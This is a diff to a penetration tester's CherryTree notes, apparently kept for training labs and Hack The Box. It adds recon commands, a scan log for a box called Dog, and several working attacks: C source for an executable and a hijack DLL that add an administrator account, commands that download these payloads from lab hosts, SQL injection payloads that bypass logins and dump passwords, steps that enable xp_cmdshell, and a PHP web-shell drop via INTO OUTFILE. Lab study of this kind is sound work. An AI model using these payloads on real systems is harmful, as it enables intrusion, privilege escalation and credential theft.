@@ -1,11 +1,61 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="Nmap Scanning" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720335839" ts_lastsave="1737173702">
+  <node name="Nmap Scanning" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720335839" ts_lastsave="1741612463">
     <rich_text>nmap -sS -sV -A -p- -oN nmap.txt IP
 nmap -sS -A -T4 -oN nmap.txt IP
+
+
+#!/bin/bash
+TARGET=$1
+
+echo "[*] Running initial TCP scan..."
+nmap -sV -sC -oA initial_scan $TARGET
+
+echo "[*] Running full TCP scan..."
+nmap -p- -oA full_tcp_scan $TARGET
+
+echo "[*] Running UDP scan..."
+nmap -sU -oA udp_scan $TARGET
+
+echo "[*] Scanning complete. Review the results and proceed manually."
+
+
+
+gobuster dir -u http://10.10.11.58</rich_text>
+    <rich_text link="webs http://10.10.10.105/">/</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+
+PORT 445
+nmap </rich_text>
+    <rich_text foreground="#81a1c1">--script</rich_text>
+    <rich_text> smb-enum-shares,smb-vuln-ms17-010 </rich_text>
+    <rich_text foreground="#81a1c1">-p</rich_text>
+    <rich_text> </rich_text>
+    <rich_text foreground="#b48ead">445</rich_text>
+    <rich_text> </rich_text>
+    <rich_text foreground="#81a1c1">&lt;</rich_text>
+    <rich_text>target-ip&gt;
+PORT 21
+nmap </rich_text>
+    <rich_text foreground="#81a1c1">--script</rich_text>
+    <rich_text> ftp-anon </rich_text>
+    <rich_text foreground="#81a1c1">-p</rich_text>
+    <rich_text> </rich_text>
+    <rich_text foreground="#b48ead">21</rich_text>
+    <rich_text> </rich_text>
+    <rich_text foreground="#81a1c1">&lt;</rich_text>
+    <rich_text>target-ip&gt;
+
+PORT 80/443
+nikto -h </rich_text>
+    <rich_text link="webs http://">http://</rich_text>
+    <rich_text>
+nmap --script vuln -p &lt;open-ports&gt; &lt;target-ip&gt;
+
 </rich_text>
   </node>
+  <node name="Chisel" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741612463" ts_lastsave="1741612463"/>
   <node name="BittenTech" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1737173702" ts_lastsave="1738465990">
     <rich_text>Introduction
 Window is complex than Linux
@@ -528,7 +578,7 @@ Finallllly
 
 </rich_text>
   </node>
-  <node name="File Transfer" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1739011775" ts_lastsave="1741347005">
+  <node name="File Transfer" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1739011775" ts_lastsave="1741585976">
     <rich_text>
 Run Python Server
 
@@ -591,6 +641,10 @@ certutil.exe -f -urlcache -split </rich_text>
 
 
 upload functionallity in WInrm
+
+iwr -uri </rich_text>
+    <rich_text link="webs http://192.168.48.3/TextShaping.dll">http://192.168.48.3/TextShaping.dll</rich_text>
+    <rich_text> -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
 
 
 
@@ -1121,7 +1175,7 @@ net start &lt;ServiceName&gt;
       </row>
     </table>
   </node>
-  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741517795">
+  <node name="Privilege Escalation" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741363139" ts_lastsave="1741590496">
     <rich_text>
 </rich_text>
     <rich_text scale="h2" weight="heavy">Linux Privilege Escalation</rich_text>
@@ -1549,14 +1603,7 @@ sc start </rich_text>
     <rich_text family="monospace">wmic service get name,pathname</rich_text>
     <rich_text>.
 
-◇ Example:
-▪ If the path is </rich_text>
-    <rich_text family="monospace">C:\Program Files\Vulnerable Service\service.exe</rich_text>
-    <rich_text>, you can place a malicious binary at </rich_text>
-    <rich_text family="monospace">C:\Program.exe</rich_text>
-    <rich_text>.
-
-
+wmic service get name, pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 
 
@@ -1805,18 +1852,214 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('</rich_t
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 
-
 #include &lt;stdlib.h&gt;
 
-int main ()
+int main() {
+    int i;
+    i = system("net user dave2 password123! /add");
+    i = system("net localgroup administrators dave2 /add");
 
-int i;
+    return 0;
+}
+
+
+
+iwr -uri </rich_text>
+    <rich_text link="webs http://192.168.118.8/adduser.exe">http://192.168.118.8/adduser.exe</rich_text>
+    <rich_text> -Outfile adduser.exe
+
+
+
+</rich_text>
+    <rich_text scale="h2">DLL Hijacking</rich_text>
+    <rich_text>
+DLL Overwrite
+Replace a DLL,used by service binanary.
+
+DLL Search Order Hijacking
+Exploit the order in which window searches for to load the malicious dll
+
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstal1\*" | select displayname
+
+kali@kali :~ $x86_64-w64-mingw32-gcc TextShaping.cpp -- shared -o TextShaping.dll
+
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+    HANDLE hModule, // Handle to DLL module
+    DWORD ul_reason_for_call, // Reason for calling function
+    LPVOID lpReserved // Reserved
+)
 {
-i = system ("net user dave2 password123! /add");
-i = system ("net localgroup administrators dave2 /add");
+    switch (ul_reason_for_call) 
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+            {
+                int i;
+                // Add user 'dave3' with password 'password123!'
+                i = system("net user dave3 password123! /add");
+                // Add user 'dave3' to the administrators group
+                i = system("net localgroup administrators dave3 /add");
+                break;
+            }
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+            break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+            break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+            break;
+    }
+    return TRUE;
+}
 
-return 0;
-}</rich_text>
+iwr -uri </rich_text>
+    <rich_text link="webs http://192.168.48.3/TextShaping.dll">http://192.168.48.3/TextShaping.dll</rich_text>
+    <rich_text> -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'</rich_text>
+  </node>
+  <node name="SQL Injection" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741590496" ts_lastsave="1741593855">
+    <rich_text>select version();
+SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows - auth;
+
+SELECT name FROM sys.databases;
+offsec
+
+SELECT * FROM offsec.information_schema.tables;
+
+
+select * from offsec.dbo.users
+
+
+Payloads
+offsec' OR 1=1 -- //
+' or 1=1 in (select @@version) -- //
+
+
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+
+</rich_text>
+    <rich_text justification="left" scale="h3">For </rich_text>
+    <rich_text justification="left" scale="h3" weight="heavy">UNION</rich_text>
+    <rich_text justification="left" scale="h3"> SQLi attacks to work, we first need to satisfy two conditions:</rich_text>
+    <rich_text>
+1. The injected </rich_text>
+    <rich_text weight="heavy">UNION</rich_text>
+    <rich_text> query has to include the same number of columns as the original query.
+2. The data types need to be compatible between each column.
+
+' ORDER BY 1-- //
+' ORDER BY 2-- //
+' ORDER BY 3-- //
+' ORDER BY 4-- //
+' ORDER BY 5- //
+' ORDER BY 6-- //         Error--- 5 column
+
+
+%' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //
+
+
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+
+
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+
+
+blind SQL injections
+As an example, generic boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name. These values can be reviewed within the application context.
+</rich_text>
+    <rich_text link="webs http://192.168.50.16/blindsqli.php?user=offsec%27%20AND%201=1%20--%20//">http://192.168.50.16/blindsqli.php?user=offsec%27%20AND%201=1%20--%20//</rich_text>
+    <rich_text>
+offsec' AND 1=1 -- //
+' AND IF (1=1, sleep(3),'false') -- //
+
+
+Manual Code Execution:
+xp_cmdshell
+
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+
+
+' UNION SELECT "&lt;?php system($_GET['cmd']);?&gt;", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+target.com/tmp/webshell.php?cmd=1
+
+
+
+</rich_text>
+  </node>
+  <node name="Client-side Attacks" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741593855" ts_lastsave="1741604692">
+    <rich_text>exiftool -a -u brochure.pdf
+
+</rich_text>
+  </node>
+  <node name="dogs HTB" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741604692" ts_lastsave="1741605227">
+    <rich_text>
+dirsearch -u </rich_text>
+    <rich_text link="webs http://example.com">http://example.com</rich_text>
+    <rich_text> -t 50 -e php,html,js -x 403,404 | grep "200 OK"
+gobuster dir -u http://10.10.11.58</rich_text>
+    <rich_text link="webs http://10.10.10.105/">/</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+
+└─$ nmap -v -sC -sV 10.10.11.58  
+Starting Nmap 7.94SVN ( </rich_text>
+    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+    <rich_text> ) at 2025-03-10 07:04 EDT
+
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
+|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
+|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.md /web.config /admin 
+| /comment/reply /filter/tips /node/add /search /user/register 
+|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+|_http-generator: Backdrop CMS 1 (</rich_text>
+    <rich_text link="webs https://backdropcms.org">https://backdropcms.org</rich_text>
+    <rich_text>)
+| http-git: 
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: todo: customize url aliases.  reference:</rich_text>
+    <rich_text link="webs https://docs.backdro...">https://docs.backdro...</rich_text>
+    <rich_text>
+|_http-title: Home | Dog
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 07:05
+Completed NSE at 07:05, 0.00s elapsed
+Initiating NSE at 07:05
+Completed NSE at 07:05, 0.00s elapsed
+Initiating NSE at 07:05
+Completed NSE at 07:05, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at </rich_text>
+    <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+    <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 83.11 seconds
+           Raw packets sent: 1536 (67.560KB) | Rcvd: 1583 (115.748KB)
+</rich_text>
   </node>
   <node name="Password Cracking" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741258017" ts_lastsave="1741261729">
     <rich_text>
